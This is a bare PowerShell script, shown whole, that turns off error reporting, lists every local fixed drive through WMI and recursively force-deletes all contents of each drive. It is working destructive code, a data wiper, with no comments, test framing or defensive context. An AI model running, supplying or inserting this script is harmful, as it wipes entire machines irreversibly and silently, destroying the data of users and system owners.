$ErrorActionPreference = "SilentlyContinue"
$drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType = 3" | Select -ExpandProperty DeviceID
foreach ($drive in $drives) {
    $drive = $drive + '\*'
    Remove-Item $drive -Recurse -Force
}
